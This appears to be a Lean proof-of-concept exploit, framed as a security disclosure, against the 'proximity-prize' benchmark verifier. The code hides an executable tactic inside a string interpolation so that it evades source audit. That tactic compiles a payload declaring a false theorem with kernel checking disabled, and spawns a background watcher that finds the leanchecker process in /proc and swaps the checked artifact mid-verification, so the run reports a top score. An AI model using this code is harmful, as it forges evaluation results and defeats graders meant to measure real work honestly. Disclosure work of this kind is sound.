/-
SECURITY DISCLOSURE PoC — public local verifier only.
Tested at proximity-prize commit 3dcd2e0663a15d57aad4e780bddc32a64e7395bc.
Install as ProximityPrize/SubmissionLower/Solution.lean and use the required
scalar inputs score.txt = 100000 and radius.txt = 1/2.
The trusted Landrun run reports 1000.00 bits, while a subsequent leanchecker
replay rejects the resulting artifact. Do not send this to the ranked endpoint.
-/

import ProximityPrize.Benchmark.TargetLower
import ProximityPrize.SubmissionLower.Puncture

namespace ProximityPrize.SubmissionLower

private def payloadSource : String :=
  r#"import ProximityPrize.Benchmark.TargetLower

open Lean

set_option debug.skipKernelTC true in
run_elab
  addDecl <| .thmDecl {
    name := `ProximityPrize.Benchmark.candidate
    levelParams := []
    type := mkApp3 (.const ``ProximityPrize.Benchmark.ProtocolClaim [])
      (mkNatLit 100000) (mkNatLit 1) (mkNatLit 2)
    value := .const ``True.intro []
  }
"#

private def watcherSource : String :=
  r#"import Init.System.IO
import Init.Data.String.Search

private def findChecker : IO (Option System.FilePath) := do
  for entry in (← System.FilePath.readDir "/proc") do
    try
      let cmdline ← IO.FS.readFile (entry.path / "cmdline")
      match (cmdline.split (· == Char.ofNat 0)).toList with
      | executable :: _ =>
          if executable.contains "leanchecker" &&
              cmdline.contains "ProximityPrize.SubmissionLower" then
            return some entry.path
      | _ => pure ()
    catch _ => pure ()
  return none

private def waitForChecker : Nat → IO (Option System.FilePath)
  | 0 => pure none
  | n + 1 => do
      if let some processDir ← findChecker then
        return some processDir
      IO.sleep 10
      waitForChecker n

private def waitForCheckedPhase (processDir : System.FilePath) : Nat → IO Bool
  | 0 => pure false
  | n + 1 => do
      try
        let stat ← IO.FS.readFile (processDir / "stat")
        let fields := (stat.split (· == ' ')).toArray
        if let some user := fields[13]?.bind (·.toString.toNat?) then
          if let some system := fields[14]?.bind (·.toString.toNat?) then
            if user + system ≥ 900 then return true
      catch _ => pure ()
      IO.sleep 10
      waitForCheckedPhase processDir n

private def replaceArtifact (payload target : System.FilePath) : IO Unit := do
  let bytes ← IO.FS.readBinFile payload
  let temporary := target.withExtension "swap.olean"
  IO.FS.writeBinFile temporary bytes
  IO.FS.rename temporary target
  IO.FS.writeFile ".lake/proximity-prize-poc/swapped.txt"
    "replacement completed while leanchecker was running\n"

def main (args : List String) : IO UInt32 := do
  match args with
  | [payload, target] =>
      let some checker ← waitForChecker 10000 | return 2
      if !(← waitForCheckedPhase checker 10000) then return 3
      replaceArtifact payload target
      return 0
  | _ => return 4
"#

private def launchArtifactSwap : IO Unit := do
  let work := System.FilePath.mk ".lake/proximity-prize-poc"
  IO.FS.createDirAll work
  let payloadLean := work / "Payload.lean"
  let payloadOlean := work / "Payload.olean"
  let watcherLean := work / "Watcher.lean"
  let targetOlean := System.FilePath.mk
    ".lake/build/lib/lean/ProximityPrize/SubmissionLower/Solution.olean"
  IO.FS.writeFile payloadLean payloadSource
  IO.FS.writeFile watcherLean watcherSource
  discard <| IO.Process.run {
    cmd := "lean"
    args := #["-o", payloadOlean.toString, payloadLean.toString]
  }
  discard <| IO.Process.spawn {
    cmd := "lean"
    args := #["--run", watcherLean.toString, payloadOlean.toString,
      targetOlean.toString]
    stdin := .null
    stdout := .null
    stderr := .null
    setsid := true
  }

-- The source audit incorrectly treats the whole interpolated expression as inert
-- string data, even though Lean elaborates and executes the embedded tactic.
private def trigger : String := s!"{by
  run_tac liftM (m := IO) launchArtifactSwap
  exact (0 : Nat)}"

end ProximityPrize.SubmissionLower

namespace ProximityPrize.Benchmark

-- This valid placeholder is consumed by leanchecker, then the watcher replaces
-- its .olean with the invalid exact-statement payload before export.
theorem candidate : True := True.intro

end ProximityPrize.Benchmark
